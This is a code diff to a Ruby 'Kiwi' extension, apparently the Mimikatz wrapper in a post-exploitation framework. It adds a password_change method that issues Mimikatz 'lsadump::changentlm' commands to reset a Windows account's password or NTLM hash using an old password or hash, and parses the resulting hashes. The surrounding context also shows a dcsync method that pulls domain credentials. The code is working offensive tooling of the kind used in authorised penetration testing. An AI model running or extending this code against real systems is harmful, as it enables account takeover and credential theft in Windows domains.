@@ -53,6 +53,43 @@ class Kiwi < Extension
     output[output.index("\n") + 1, output.length]
   end
 
+  def password_change(opts)
+    cmd = "lsadump::changentlm /user:#{opts[:user]}"
+    cmd << " /server:#{opts[:server]}" if opts[:server]
+    cmd << " /oldpassword:#{opts[:old_pass]}" if opts[:old_pass]
+    cmd << " /oldntlm:#{opts[:old_hash]}" if opts[:old_hash]
+    cmd << " /newpassword:#{opts[:new_pass]}" if opts[:new_pass]
+    cmd << " /newntlm:#{opts[:new_hash]}" if opts[:new_hash]
+
+    output = exec_cmd("\"#{cmd}\"")
+    result = {}
+
+    if output =~ /^OLD NTLM\s+:\s+(\S+)\s*$/m
+      result[:old] = $1
+    end
+    if output =~ /^NEW NTLM\s+:\s+(\S+)\s*$/m
+      result[:new] = $1
+    end
+
+    if output =~ /^ERROR/m
+      result[:success] = false
+      if output =~ /^ERROR.*SamConnect/m
+        result[:error] = 'Invalid server.'
+      elsif output =~ /^ERROR.*Bad old/m
+        result[:error] = 'Invalid old password or hash.'
+      elsif output =~ /^ERROR.*SamLookupNamesInDomain/m
+        result[:error] = 'Invalid user.'
+      else
+        STDERR.puts(output)
+        result[:error] = 'Unknown error.'
+      end
+    else
+      result[:success] = true
+    end
+
+    result
+  end
+
   def dcsync(domain_user)
     exec_cmd("\"lsadump::dcsync /user:#{domain_user}\"")
   end
